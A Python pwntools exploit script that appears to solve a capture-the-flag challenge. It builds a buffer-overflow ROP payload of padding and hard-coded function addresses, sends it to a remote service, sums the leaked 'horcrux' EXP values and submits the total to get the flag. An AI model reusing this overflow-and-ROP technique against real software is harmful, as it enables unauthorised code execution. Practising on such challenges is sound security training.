#!/usr/bin/env python3

from pwn import *
from ctypes import c_int32

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)

    # Only remote option, exit otherwise
    exit()

# ===========================================================
#                      CREATE PAYLOAD
# ===========================================================
log.info("Creating payload...")

padding = 120

FUNC_A = 0x0809fe4b 
FUNC_B = 0x0809fe6a
FUNC_C = 0x0809fe89
FUNC_D = 0x0809fea8
FUNC_E = 0x0809fec7
FUNC_F = 0x0809fee6
FUNC_G = 0x0809ff05
back_to_ropme = 0x0809fffc

payload = flat(
        b'A' * padding,
        p32(FUNC_A),
        p32(FUNC_B),
        p32(FUNC_C),
        p32(FUNC_D),
        p32(FUNC_E),
        p32(FUNC_F),
        p32(FUNC_G),

        p32(back_to_ropme),
        )

with open('payload', 'wb') as f:
    f.write(payload)

# ===========================================================
#                     EXPLOIT REMOTELY
# ===========================================================
io = start()

# Send the payload
io.sendlineafter(b':', b'69')
io.sendlineafter(b': ', payload)
io.recvline()

# calculate total EXP
exp = 0
for i in range(7):
    line = io.recvline().decode()
    horcrux = line[line.find('"')+1:line.rfind('"')]
    val = int(line.split('+')[1][:-2])
    log.info(f'Horcrux: "{horcrux}" = {val}')
    exp += val
exp = c_int32(exp).value

# Receive the flag
log.info(f'Total EXP: {exp}')    
io.sendlineafter(b':', b'420')
io.sendlineafter(b': ', str(exp).encode())
flag = io.recvline().decode()
io.close()

log.success(f'Flag: {flag}')
